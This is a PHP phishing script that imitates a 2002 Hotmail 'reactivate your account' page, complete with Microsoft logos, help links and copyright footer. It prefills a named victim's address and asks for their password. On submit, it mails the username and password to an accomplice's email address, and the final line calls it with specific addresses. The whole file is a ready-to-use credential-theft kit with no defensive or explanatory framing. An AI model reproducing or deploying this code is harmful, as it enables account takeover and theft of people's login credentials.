<?php
function cachada($victima,$complice)
{
?>
<HTML>
<HEAD>
<TITLE>Reactivate your hotmail account - marco_canderle@hotmail.com</TITLE>
</HEAD>

<BODY topmargin=0>

<?

if ($action == "Reactivate")
{

mail($complice, $username, $password, "From:
Personal de Hotmail");
echo "Your hotmail account has been reactivated<BR>";

}

?>

<tr>
<td colspan=2>
<table cellpadding=0 cellspacing=0 border=0 width="100%"><tr><td>
<a href="http://lc2.law5.hotmail.passport.com/cgi-bin/login?_lang=EN"
target="_top"><img src="http://64.4.8.24/logo_msnhmr_468x60.gif" width=468
height=60 border=0 alt=""></a>
</td>
<td align="CENTER" nowrap>
<img src="http://64.4.8.24/logo_passport_140x44.gif" width=140 height=44
border=0 alt="Find Out More About Passport"><br>
<a
href="http://nexusrdr.passport.com/redir.asp?_lang=EN&pm=id%3d2%26fs%3d1%26cb%3d_lang%253dEN%26ct%3d1021925844&attrib=Help"
target="_top"><font class="f" size=2>Help</font></a><br>
</td></tr></table>
</td>
</tr><tr>
<td style="padding:3px;" bgcolor="#93BEE2"><font class="Wf"><b>Please
reactivate your hotmail.com account:</b></font></td>
<td valign="top"></td>
</tr>
<tr><td height="6"></td></tr>
<tr valign="top">
<td><font class="s">

</font>
</td>
<td rowspan=4><font class="s">

</font>
</font>
</td>
</tr>

<tr>
<td>
<font class="f" size=2><b>&lt;<?php echo $victima; ?>&gt;</b></font>
</td>
</tr>
<form name="mailbomber" method="post" action="<?php echo $PHP_SELF ?>">

<BR>

<B>Username:</B>
<td>
<input type="text" name="username" value="<?php echo $victima; ?>">
</td>
</tr>
<tr> <BR>
<B>Password:</B>
<td>
<input type="text" name="password">
</td>
</tr>
&nbsp;

<input type="submit" name="action" value="Reactivate">

</table>
</form><BR><BR>
<B>Your password will not be typed as an encryption code (without the
"****") </B><BR>
<td colspan="2"><font class="f" size=2><b><a
href="http://lc3.law13.hotmail.passport.com/cgi-bin/pplogout?cu=1&id=2&fs=1&cb=_lang%3dEN&ct=1021925844&ru=http%3a%2f%2flc3%2elaw13%2ehotmail
%2epassport%2ecom%2fcgi%2dbin%2flogin%3f_lang%3dEN%26id%3d2%26fs%3d1%26cb%3d_lang%253dEN
%26ct%3d1021925844&curmbox=F000000001&a=18e5af1b8996fe2d0333a5b4bada805c&chguser=yes&SwitchUser=1"
target="_top">Change
User</a></b></font></td>
&nbsp;<font class="s">&copy; 2002 Microsoft Corporation. All rights
reserved.</font> <a href="http://g.msn.com/1HM305301/18" target="_top"><font
class="s">TERMS OF USE</font></a>
&nbsp;&nbsp;<a href="http://g.msn.com/1HM305301/17" target="_top"><font
class="s">TRUSTe Approved Privacy Statement</font></a>
</CENTER>
</BODY>
</HTML>
<?php
}
?>
<?php
cachada("soypablorojo@hotmail.com","daingara@unsl.edu.ar");
?>